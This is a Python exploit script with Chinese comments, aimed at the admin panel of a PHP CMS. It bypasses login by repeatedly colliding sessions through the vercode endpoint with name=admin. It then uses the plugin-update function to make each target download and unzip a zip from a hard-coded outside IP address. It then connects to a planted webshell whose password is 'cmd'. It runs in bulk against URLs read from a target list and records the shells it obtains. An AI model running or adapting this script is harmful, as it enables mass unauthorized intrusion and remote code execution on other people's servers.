import requests
import re

#查找可用session
# ================= 配置区域 =================
admin_path = "/index.php/admins"
remote_zip_url = "http://158.101.148.48/hack.zip" 
# ===========================================
dict_sessions = {}
attack_result = {}
headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest"
}

s = requests.Session()
def check_is_really_admin(html_content):
    """
    通过页面内容判断是否真的进入了后台
    """
    # 特征1: 检查是否有“退出”或“注销”链接
    if "退出" in html_content or "loginout" in html_content:
        return True
    # 特征2: 检查是否有后台特有的菜单，比如“系统设置”、“栏目管理”
    if "系统设置" in html_content or "栏目管理" in html_content:
        return True
    # 特征3: 检查Title是否包含“后台管理”且不包含“登录”
    if "后台管理" in html_content and "登录" not in html_content:
        return True
    return False

def brute_force_and_verify(target_url):
    print("[*] 开始 Session 碰撞验证...")
    # 碰撞接口
    vercode_url = f"{target_url}{admin_path}/Login/vercode"
    # 验证接口：使用 Index/index，这是后台框架页，最容易判断
    verify_url = f"{target_url}{admin_path}/Index/index"
    
    count = 0
    success = False
    status_code_sum = 0
    
    while not success:
        count += 1
        try:
            # 1. 发送碰撞请求
            # 注意：必须带上 name=admin，这是漏洞利用的核心
            s.get(vercode_url, params={"name": "admin"})
            
            # 2. 尝试访问后台主页 (禁止自动跳转，我们要看原始响应)
            resp = s.get(verify_url, allow_redirects=False)
            # 状态码判断
            if resp.status_code == 302:
                # 302 跳转通常意味着 Session 无效，被踢回登录页了
                print(f"[{count}] 302 跳转 -> 失败 (Session: {s.cookies.get('PHPSESSID')})", end="\r")
            
            elif resp.status_code//100 == 4:
                # 4xx 错误一般是权限问题，说明 目录无法访问
                print(f"[{count}] {resp.status_code} 客户端错误 -> 失败", end="\r")
                return False
            elif resp.status_code//100 == 5:
                # 5xx 错误一般是服务器问题，说明 目录无法访问
                print(f"[{count}] {resp.status_code} 服务器错误 -> 失败", end="\r")
                return False
            elif resp.status_code == 200:
                # 200 OK，有可能是成功，也有可能是直接显示了登录页
                # 必须检查内容！
                resp.encoding = 'utf-8' # 防止乱码
                html = resp.text
                
                if check_is_really_admin(html):
                    print(f"\n\n[+] 成功绕过! 在第 {count} 次尝试。")
                    print(f"[+] PHPSESSID: {s.cookies.get('PHPSESSID')}")
                    print(f"[+] 页面标题/特征: {re.search(r'<title>(.*?)</title>', html, re.I).group(0) if re.search(r'<title>(.*?)</title>', html, re.I) else '无标题'}")
                    print("-" * 30)
                    # 打印一部分页面内容供人工确认
                    print(html) 
                    success = True

                    dict_sessions[target_url] = s.cookies.get('PHPSESSID')
                    return True
                else:
                    print(f"[{count}] 200 OK 但内容疑似登录页 -> 失败", end="\r")
                    status_code_sum += 200
            else:
                print(f"[{count}] 状态码 {resp.status_code} -> 失败", end="\r")

            if count >= 50 or (count==20 and status_code_sum == 4000):
                print("\n[-] 尝试次数过多，停止攻击。")
                return False
            # 失败后清空 Cookie 重试
            if not success:
                s.cookies.clear()
                
        except Exception as e:
            print(f"\n[-] 请求异常: {e}")
            return False

def debug_print(step, resp):
    print(f"\n[-] {step} 响应: [{resp.status_code}]")
    # 只打印前200个字符避免刷屏，如果是报错则打印更多
    print(resp.text[:300] + "..." if len(resp.text) > 300 else resp.text)

def run_remote_exploit(target_url):
    print(f"[*] 开始执行远程下载攻击...")
    print(f"[*] 恶意 ZIP 地址: {remote_zip_url}")

    # 1. 触发下载 (start-download)
    print("\n[1/3] 让靶机下载恶意 ZIP...")
    plugin_url = f"{target_url}{admin_path}/Plugins/update"
    
    # 这里的 filepath 必须对应 zip 里的文件夹名 (hack)
    data_down = {
        "action": "start-download",
        "filepath": "hack", 
        "download_url": remote_zip_url
    }
    
    try:
        # 靶机下载
        resp = s.post(plugin_url, data=data_down, headers=headers, timeout=10)
        debug_print("下载请求", resp)
        
        # 检查是否下载成功
        if '"code":0' in resp.text and "tmp_path" in resp.text:
            print("[+] 下载成功！靶机已获取 ZIP。")
        else:
            print("[-] 下载似乎失败了。请检查：")
            print("    1. 目标是否真的能访问你的 IP？(不出网环境无法使用此方法)")
            print("    2. 你的 HTTP 服务开启了吗？")
            return
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return

    # 2. 触发解压 (file-upzip)
    print("\n[2/3] 触发解压...")
    data_unzip = {
        "action": "file-upzip",
        "filepath": "hack"
    }
    
    try:
        resp = s.post(plugin_url, data=data_unzip, headers=headers)
        debug_print("解压请求", resp)
        
        if "Fatal error" in resp.text and "zip_open" in resp.text:
            print("\n[!] 严重错误: 服务器不支持 zip_open 函数。此路不通。")
            return
        
        if '"code":0' in resp.text:
            print("[+] 解压成功！")
        else:
            print("[-] 解压报错，请查看上方响应。")
    except Exception as e:
        print(f"[-] 请求异常: {e}")

    # 3. 验证 Webshell
    shell_url = f"{target_url}/app/admin/exts/hack/test.php"
    print(f"\n[3/3] 尝试连接 Webshell: {shell_url}")
    
    try:
        resp = requests.get(shell_url, headers=headers, timeout=5)
        if resp.status_code == 200 and "RCE_OK" in resp.text:
            print(f"\n[SUCCESS] 成功拿到 Shell！")
            print(f"地址: {shell_url}")
            print(f"密码: cmd")
            attack_result[target_url] = shell_url
        else:
            print(f"[-] 连接失败 (Status: {resp.status_code})。可能文件未生成或被拦截。")
            attack_result[target_url] = "Failed"
    except Exception as e:
        print(f"[-] 连接异常: {e}")

if __name__ == "__main__":
    
    #从文件中批量导入url
    with open("target.txt","r") as f:
        targets = [line.strip() for line in f if line.strip()]
    print(f"共加载 {len(targets)} 个目标。")

    for i in range(len(targets)):
        target_url = targets[i]
        print(f"\n[*] 正在测试目标 {i+1}/{len(targets)}: {target_url}")
        flag = brute_force_and_verify(target_url)
        if flag:
            s.cookies.update({"PHPSESSID": dict_sessions[target_url]}) #更新session
            run_remote_exploit(target_url)
        else:
            print("[-] 未能绕过登录，跳过远程攻击步骤。")
    
    print("\n[*] 攻击结果汇总:")
    for url, result in attack_result.items():
        print(f"{url} -> {result}")
        with open("attack_results.txt","a") as f:
            f.write(f"{url} -> {result}\n")
    print("\n[*] 结果已保存到 attack_results.txt 文件中。")